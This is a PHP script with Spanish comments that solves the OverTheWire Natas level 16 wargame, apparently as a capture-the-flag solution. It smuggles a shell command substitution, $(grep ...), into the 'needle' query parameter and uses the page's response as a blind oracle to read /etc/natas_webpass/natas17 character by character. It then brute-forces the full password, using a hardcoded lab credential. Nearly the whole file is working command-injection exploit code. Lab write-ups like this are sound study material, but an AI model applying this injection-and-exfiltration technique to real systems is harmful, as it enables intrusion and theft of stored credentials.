<?php

# Variables globales
$caracteres = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
$longitud_caracteres = strlen($caracteres);

$filtrados = "";
$contrasena_final = "";

# Conectar a natas16 usando la biblioteca PHP curl
$manejador = curl_init();

# Definir parámetros de conexión
$url = "http://natas16.natas.labs.overthewire.org/";
$usuario = "natas16";
$contrasena = "TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V";

# Bucle de caracteres
echo "Verificando caracteres en la contraseña...\n";
for ($i = 0; $i < $longitud_caracteres; $i++) {

    # Establecer la conexión a natas16
    curl_setopt_array($manejador,
        array(
            CURLOPT_URL               => $url.'?needle=doomed$(grep%20'. $caracteres[$i] .'%20/etc/natas_webpass/natas17)',
            CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
            CURLOPT_USERPWD           => "$usuario:$contrasena",
            CURLOPT_RETURNTRANSFER    => true
        )
    );

    # Ejecutar la petición
    $respuesta_servidor = curl_exec($manejador);

    # Si el carácter está en la cadena de la contraseña...
    if (stripos($respuesta_servidor, "doomed") === false) {
        $filtrados .= $caracteres[$i];
    }

}

# Mostrar caracteres filtrados
echo "Caracteres filtrados: ". $filtrados . "\n";

# Fuerza bruta para obtener la contraseña
echo "Usando fuerza bruta para obtener la contraseña final...\n";
$longitud_filtrados = strlen($filtrados);
for ($i = 0; $i < 32; $i++) {
    for ($j = 0; $j < $longitud_filtrados; $j++) {

        # Establecer la conexión a natas16
        curl_setopt_array($manejador,
            array(
                CURLOPT_URL               => $url.'?needle=doomed$(grep%20^' . $contrasena_final . $filtrados[$j] . '%20/etc/natas_webpass/natas17)',
                CURLOPT_HTTPAUTH          => CURLAUTH_ANY,
                CURLOPT_USERPWD           => "$usuario:$contrasena",
                CURLOPT_RETURNTRANSFER    => true
            )
        );

        # Ejecutar la petición
        $respuesta_servidor = curl_exec($manejador);

        # Si el carácter está en la cadena de la contraseña...
        if (stripos($respuesta_servidor, "doomed") === false) {
            $contrasena_final .= $filtrados[$j];
            echo $contrasena_final . "\n";
            break;
        }

    }
}

echo "Contraseña: " . $contrasena_final . "\n";

# Cerrar conexión
curl_close($manejador);
